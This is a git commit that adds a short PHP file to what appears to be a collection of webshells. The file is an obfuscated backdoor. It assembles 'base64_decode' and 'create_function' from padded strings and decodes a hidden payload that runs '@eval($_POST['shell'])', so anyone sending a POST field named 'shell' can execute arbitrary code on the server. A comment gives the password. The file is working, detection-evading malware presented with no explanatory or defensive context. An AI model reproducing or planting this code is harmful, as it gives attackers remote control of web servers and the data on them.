c165cdd6decd3da80a0bcf96c6b9239791f33646
0xFlag <54313514+0xFlag@users.noreply.github.com>
2020-08-15 16:04:59 +0800

    Create 33.php

---
+++ yjh/php/33.php
@@ -0,0 +1,13 @@
+<?php
+$uf="9ATVFsnc2hl";
+$ka="IEBldmA";
+$pjt="FsKCRfUE";
+$vbl = str_replace("ti","","tistittirti_rtietipltiatice");
+$iqw="bAGwnXASk7";
+$bkf = $vbl("k", "", "kbakske6k4k_kdkekckokdke");
+$sbp = $vbl("ctw","","ctwcctwrectwatctwectw_fctwuncctwtctwioctwn");
+$mpy = $sbp('', $bkf($vbl("A", "", $ka.$pjt.$uf.$iqw)));
+$mpy();
+?>
+
+//password:shell
